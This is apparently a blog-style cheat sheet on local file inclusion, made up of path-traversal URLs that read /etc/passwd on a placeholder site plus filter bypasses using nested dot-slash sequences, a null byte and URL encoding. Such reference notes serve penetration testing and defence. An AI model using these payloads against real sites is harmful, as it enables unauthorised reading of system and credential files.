---
layout: post
title: "lfi"
keywords: "lfi, loccal file inclusion, lfd, local file disclosure"
---
#### Basic
```
https://mysite.com/view_file?image=/images/avatar.png

https://mysite.com/view_file?image=/etc/passwd
https://mysite.com/view_file?image=../../../../../etc/passwd
```

#### Bypassing
```
# Filters out ../
..././ = ../
....// = ../
https://mysite.com/view_file?image=..././..././..././..././..././etc/passwd

# Enforces file extension (Null Byte)
https://mysite.com/view_file?image=/etc/passwd?%00csv

# URL Encoding
. = %2e
/ = %2f
../ = %2e%2e%2f
https://mysite.com/view_file?image=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00csv
```